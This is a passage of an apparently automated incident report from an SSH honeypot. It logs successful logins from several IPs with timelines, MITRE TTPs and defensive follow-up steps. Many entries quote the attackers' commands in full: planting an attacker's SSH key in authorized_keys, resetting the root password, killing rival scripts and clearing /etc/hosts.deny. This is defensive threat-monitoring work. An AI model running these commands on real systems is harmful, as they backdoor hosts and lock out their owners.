| `2026-06-11 11:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-336e2d624724

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 11:04 |
| **Last Seen** | 2026-06-11 11:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 11:04:00` | `cowrie.session.connect` |
| `2026-06-11 11:04:01` | `cowrie.client.version` |
| `2026-06-11 11:04:01` | `cowrie.client.kex` |
| `2026-06-11 11:04:01` | `cowrie.login.success` |
| `2026-06-11 11:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56008a5b5488

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 11:06 |
| **Last Seen** | 2026-06-11 11:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 11:06:31` | `cowrie.session.connect` |
| `2026-06-11 11:06:31` | `cowrie.client.version` |
| `2026-06-11 11:06:31` | `cowrie.client.kex` |
| `2026-06-11 11:06:31` | `cowrie.login.success` |
| `2026-06-11 11:06:32` | `cowrie.session.params` |
| `2026-06-11 11:06:32` | `cowrie.command.input` |
| `2026-06-11 11:06:32` | `cowrie.command.failed` |
| `2026-06-11 11:06:32` | `cowrie.log.closed` |
| `2026-06-11 11:06:32` | `cowrie.session.params` |
| `2026-06-11 11:06:32` | `cowrie.command.input` |
| `2026-06-11 11:06:32` | `cowrie.session.file_download` |
| `2026-06-11 11:06:32` | `cowrie.log.closed` |
| `2026-06-11 11:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af08126d7e6d

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 11:06 |
| **Last Seen** | 2026-06-11 11:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 11:06:34` | `cowrie.session.connect` |
| `2026-06-11 11:06:34` | `cowrie.client.version` |
| `2026-06-11 11:06:34` | `cowrie.client.kex` |
| `2026-06-11 11:06:35` | `cowrie.login.success` |
| `2026-06-11 11:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7c14bebb9f0

| Field | Detail |
|---|---|
| **Source IP** | `114.111.53[.]214` |
| **First Seen** | 2026-06-11 11:36 |
| **Last Seen** | 2026-06-11 11:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 11:36:35` | `cowrie.session.connect` |
| `2026-06-11 11:36:35` | `cowrie.client.version` |
| `2026-06-11 11:36:35` | `cowrie.client.kex` |
| `2026-06-11 11:36:35` | `cowrie.login.success` |
| `2026-06-11 11:36:36` | `cowrie.session.params` |
| `2026-06-11 11:36:36` | `cowrie.command.input` |
| `2026-06-11 11:36:36` | `cowrie.command.failed` |
| `2026-06-11 11:36:36` | `cowrie.log.closed` |
| `2026-06-11 11:36:36` | `cowrie.session.params` |
| `2026-06-11 11:36:36` | `cowrie.command.input` |
| `2026-06-11 11:36:36` | `cowrie.session.file_download` |
| `2026-06-11 11:36:36` | `cowrie.log.closed` |
| `2026-06-11 11:36:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.53[.]214` to AbuseIPDB if not already reported
- [ ] Block `114.111.53[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfcf07868d8d

| Field | Detail |
|---|---|
| **Source IP** | `114.111.53[.]214` |
| **First Seen** | 2026-06-11 11:36 |
| **Last Seen** | 2026-06-11 11:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 11:36:38` | `cowrie.session.connect` |
| `2026-06-11 11:36:38` | `cowrie.client.version` |
| `2026-06-11 11:36:38` | `cowrie.client.kex` |
| `2026-06-11 11:36:39` | `cowrie.login.success` |
| `2026-06-11 11:36:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.53[.]214` to AbuseIPDB if not already reported
- [ ] Block `114.111.53[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90975fa65ea0

| Field | Detail |
|---|---|
| **Source IP** | `58.6.206[.]239` |
| **First Seen** | 2026-06-11 12:39 |
| **Last Seen** | 2026-06-11 12:39 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 12:39:31` | `cowrie.session.connect` |
| `2026-06-11 12:39:31` | `cowrie.client.version` |
| `2026-06-11 12:39:32` | `cowrie.client.kex` |
| `2026-06-11 12:39:35` | `cowrie.login.success` |
| `2026-06-11 12:39:37` | `cowrie.session.params` |
| `2026-06-11 12:39:37` | `cowrie.command.input` |
| `2026-06-11 12:39:37` | `cowrie.command.failed` |
| `2026-06-11 12:39:37` | `cowrie.log.closed` |
| `2026-06-11 12:39:38` | `cowrie.session.params` |
| `2026-06-11 12:39:38` | `cowrie.command.input` |
| `2026-06-11 12:39:38` | `cowrie.session.file_download` |
| `2026-06-11 12:39:38` | `cowrie.log.closed` |
| `2026-06-11 12:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.6.206[.]239` to AbuseIPDB if not already reported
- [ ] Block `58.6.206[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adb76e4cebff

| Field | Detail |
|---|---|
| **Source IP** | `58.6.206[.]239` |
| **First Seen** | 2026-06-11 12:39 |
| **Last Seen** | 2026-06-11 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 12:39:45` | `cowrie.session.connect` |
| `2026-06-11 12:39:45` | `cowrie.client.version` |
| `2026-06-11 12:39:46` | `cowrie.client.kex` |
| `2026-06-11 12:39:49` | `cowrie.login.success` |
| `2026-06-11 12:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.6.206[.]239` to AbuseIPDB if not already reported
- [ ] Block `58.6.206[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb49a14faa0a

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-06-11 12:46 |
| **Last Seen** | 2026-06-11 12:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 12:46:38` | `cowrie.session.connect` |
| `2026-06-11 12:46:38` | `cowrie.client.version` |
| `2026-06-11 12:46:39` | `cowrie.client.kex` |
| `2026-06-11 12:46:40` | `cowrie.login.success` |
| `2026-06-11 12:46:40` | `cowrie.session.params` |
| `2026-06-11 12:46:40` | `cowrie.command.input` |
| `2026-06-11 12:46:40` | `cowrie.command.failed` |
| `2026-06-11 12:46:41` | `cowrie.log.closed` |
| `2026-06-11 12:46:41` | `cowrie.session.params` |
| `2026-06-11 12:46:41` | `cowrie.command.input` |
| `2026-06-11 12:46:41` | `cowrie.session.file_download` |
| `2026-06-11 12:46:41` | `cowrie.log.closed` |
| `2026-06-11 12:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ec8e72991b

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-06-11 12:46 |
| **Last Seen** | 2026-06-11 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 12:46:45` | `cowrie.session.connect` |
| `2026-06-11 12:46:45` | `cowrie.client.version` |
| `2026-06-11 12:46:45` | `cowrie.client.kex` |
| `2026-06-11 12:46:46` | `cowrie.login.success` |
| `2026-06-11 12:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de8af75f805

| Field | Detail |
|---|---|
| **Source IP** | `218.78.60[.]105` |
| **First Seen** | 2026-06-11 13:30 |
| **Last Seen** | 2026-06-11 13:31 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:7MmpLwhwBfNB"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 13:30:32` | `cowrie.session.connect` |
| `2026-06-11 13:30:32` | `cowrie.client.version` |
| `2026-06-11 13:30:32` | `cowrie.client.kex` |
| `2026-06-11 13:30:33` | `cowrie.login.success` |
| `2026-06-11 13:30:33` | `cowrie.session.params` |
| `2026-06-11 13:30:33` | `cowrie.command.input` |
| `2026-06-11 13:30:33` | `cowrie.command.failed` |
| `2026-06-11 13:30:34` | `cowrie.log.closed` |
| `2026-06-11 13:30:34` | `cowrie.session.params` |
| `2026-06-11 13:30:34` | `cowrie.command.input` |
| `2026-06-11 13:30:35` | `cowrie.session.file_download` |
| `2026-06-11 13:30:35` | `cowrie.log.closed` |
| `2026-06-11 13:30:48` | `cowrie.session.params` |
| `2026-06-11 13:30:48` | `cowrie.command.input` |
| `2026-06-11 13:30:48` | `cowrie.log.closed` |
| `2026-06-11 13:30:49` | `cowrie.session.params` |
| `2026-06-11 13:30:49` | `cowrie.command.input` |
| `2026-06-11 13:30:49` | `cowrie.log.closed` |
| `2026-06-11 13:30:49` | `cowrie.session.params` |
| `2026-06-11 13:30:49` | `cowrie.command.input` |
| `2026-06-11 13:30:50` | `cowrie.session.file_download` |
| `2026-06-11 13:30:50` | `cowrie.log.closed` |
| `2026-06-11 13:30:50` | `cowrie.session.params` |
| `2026-06-11 13:30:50` | `cowrie.command.input` |
| `2026-06-11 13:30:51` | `cowrie.log.closed` |
| `2026-06-11 13:30:52` | `cowrie.session.params` |
| `2026-06-11 13:30:52` | `cowrie.command.input` |
| `2026-06-11 13:30:52` | `cowrie.log.closed` |
| `2026-06-11 13:30:53` | `cowrie.session.params` |
| `2026-06-11 13:30:53` | `cowrie.command.input` |
| `2026-06-11 13:30:53` | `cowrie.command.input` |
| `2026-06-11 13:30:53` | `cowrie.log.closed` |
| `2026-06-11 13:30:54` | `cowrie.session.params` |
| `2026-06-11 13:30:54` | `cowrie.command.input` |
| `2026-06-11 13:30:55` | `cowrie.log.closed` |
| `2026-06-11 13:30:55` | `cowrie.session.params` |
| `2026-06-11 13:30:55` | `cowrie.command.input` |
| `2026-06-11 13:30:56` | `cowrie.log.closed` |
| `2026-06-11 13:30:56` | `cowrie.session.params` |
| `2026-06-11 13:30:56` | `cowrie.command.input` |
| `2026-06-11 13:30:56` | `cowrie.log.closed` |
| `2026-06-11 13:30:57` | `cowrie.session.params` |
| `2026-06-11 13:30:57` | `cowrie.command.input` |
| `2026-06-11 13:30:58` | `cowrie.log.closed` |
| `2026-06-11 13:30:58` | `cowrie.session.params` |
| `2026-06-11 13:30:58` | `cowrie.command.input` |
| `2026-06-11 13:30:58` | `cowrie.log.closed` |
| `2026-06-11 13:30:58` | `cowrie.session.params` |
| `2026-06-11 13:30:58` | `cowrie.command.input` |
| `2026-06-11 13:30:58` | `cowrie.log.closed` |
| `2026-06-11 13:31:04` | `cowrie.session.params` |
| `2026-06-11 13:31:04` | `cowrie.command.input` |
| `2026-06-11 13:31:04` | `cowrie.log.closed` |
| `2026-06-11 13:31:05` | `cowrie.session.params` |
| `2026-06-11 13:31:05` | `cowrie.command.input` |
| `2026-06-11 13:31:06` | `cowrie.log.closed` |
| `2026-06-11 13:31:06` | `cowrie.session.params` |
| `2026-06-11 13:31:06` | `cowrie.command.input` |
| `2026-06-11 13:31:06` | `cowrie.log.closed` |
| `2026-06-11 13:31:06` | `cowrie.session.params` |
| `2026-06-11 13:31:06` | `cowrie.command.input` |
| `2026-06-11 13:31:07` | `cowrie.log.closed` |
| `2026-06-11 13:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.60[.]105` to AbuseIPDB if not already reported
- [ ] Block `218.78.60[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2df89ab4863

| Field | Detail |
|---|---|
| **Source IP** | `218.78.60[.]105` |
| **First Seen** | 2026-06-11 13:36 |
| **Last Seen** | 2026-06-11 13:37 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:iBniDTQuuaCv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 13:36:33` | `cowrie.session.connect` |
| `2026-06-11 13:36:33` | `cowrie.client.version` |
| `2026-06-11 13:36:34` | `cowrie.client.kex` |
| `2026-06-11 13:36:35` | `cowrie.login.success` |
| `2026-06-11 13:36:38` | `cowrie.session.params` |
| `2026-06-11 13:36:38` | `cowrie.command.input` |
| `2026-06-11 13:36:38` | `cowrie.command.failed` |
| `2026-06-11 13:36:38` | `cowrie.log.closed` |
| `2026-06-11 13:36:41` | `cowrie.session.params` |
| `2026-06-11 13:36:41` | `cowrie.command.input` |
| `2026-06-11 13:36:42` | `cowrie.session.file_download` |
| `2026-06-11 13:36:42` | `cowrie.log.closed` |
| `2026-06-11 13:36:54` | `cowrie.session.params` |
| `2026-06-11 13:36:54` | `cowrie.command.input` |
| `2026-06-11 13:36:54` | `cowrie.log.closed` |
| `2026-06-11 13:36:56` | `cowrie.session.params` |
| `2026-06-11 13:36:56` | `cowrie.command.input` |
| `2026-06-11 13:36:56` | `cowrie.log.closed` |
| `2026-06-11 13:36:58` | `cowrie.session.params` |
| `2026-06-11 13:36:58` | `cowrie.command.input` |
| `2026-06-11 13:36:59` | `cowrie.session.file_download` |
| `2026-06-11 13:36:59` | `cowrie.log.closed` |
| `2026-06-11 13:36:59` | `cowrie.session.params` |
| `2026-06-11 13:36:59` | `cowrie.command.input` |
| `2026-06-11 13:37:00` | `cowrie.log.closed` |
| `2026-06-11 13:37:00` | `cowrie.session.params` |
| `2026-06-11 13:37:00` | `cowrie.command.input` |
| `2026-06-11 13:37:01` | `cowrie.log.closed` |
| `2026-06-11 13:37:01` | `cowrie.session.params` |
| `2026-06-11 13:37:01` | `cowrie.command.input` |
| `2026-06-11 13:37:01` | `cowrie.command.input` |
| `2026-06-11 13:37:01` | `cowrie.log.closed` |
| `2026-06-11 13:37:02` | `cowrie.session.params` |
| `2026-06-11 13:37:02` | `cowrie.command.input` |
| `2026-06-11 13:37:03` | `cowrie.log.closed` |
| `2026-06-11 13:37:09` | `cowrie.session.params` |
| `2026-06-11 13:37:09` | `cowrie.command.input` |
| `2026-06-11 13:37:09` | `cowrie.log.closed` |
| `2026-06-11 13:37:10` | `cowrie.session.params` |
| `2026-06-11 13:37:10` | `cowrie.command.input` |
| `2026-06-11 13:37:10` | `cowrie.log.closed` |
| `2026-06-11 13:37:11` | `cowrie.session.params` |
| `2026-06-11 13:37:11` | `cowrie.command.input` |
| `2026-06-11 13:37:12` | `cowrie.log.closed` |
| `2026-06-11 13:37:12` | `cowrie.session.params` |
| `2026-06-11 13:37:12` | `cowrie.command.input` |
| `2026-06-11 13:37:12` | `cowrie.log.closed` |
| `2026-06-11 13:37:12` | `cowrie.session.params` |
| `2026-06-11 13:37:12` | `cowrie.command.input` |
| `2026-06-11 13:37:13` | `cowrie.log.closed` |
| `2026-06-11 13:37:13` | `cowrie.session.params` |
| `2026-06-11 13:37:13` | `cowrie.command.input` |
| `2026-06-11 13:37:13` | `cowrie.log.closed` |
| `2026-06-11 13:37:13` | `cowrie.session.params` |
| `2026-06-11 13:37:13` | `cowrie.command.input` |
| `2026-06-11 13:37:14` | `cowrie.log.closed` |
| `2026-06-11 13:37:14` | `cowrie.session.params` |
| `2026-06-11 13:37:14` | `cowrie.command.input` |
| `2026-06-11 13:37:14` | `cowrie.log.closed` |
| `2026-06-11 13:37:14` | `cowrie.session.params` |
| `2026-06-11 13:37:14` | `cowrie.command.input` |
| `2026-06-11 13:37:14` | `cowrie.log.closed` |
| `2026-06-11 13:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.60[.]105` to AbuseIPDB if not already reported
- [ ] Block `218.78.60[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d696ace76209

| Field | Detail |
|---|---|
| **Source IP** | `218.78.60[.]105` |
| **First Seen** | 2026-06-11 13:41 |
| **Last Seen** | 2026-06-11 13:41 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NfNHzc9M0xSt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 13:41:02` | `cowrie.session.connect` |
| `2026-06-11 13:41:02` | `cowrie.client.version` |
| `2026-06-11 13:41:02` | `cowrie.client.kex` |
| `2026-06-11 13:41:06` | `cowrie.login.success` |
| `2026-06-11 13:41:07` | `cowrie.session.params` |
| `2026-06-11 13:41:07` | `cowrie.command.input` |
| `2026-06-11 13:41:07` | `cowrie.command.failed` |
| `2026-06-11 13:41:07` | `cowrie.log.closed` |
| `2026-06-11 13:41:08` | `cowrie.session.params` |
| `2026-06-11 13:41:08` | `cowrie.command.input` |
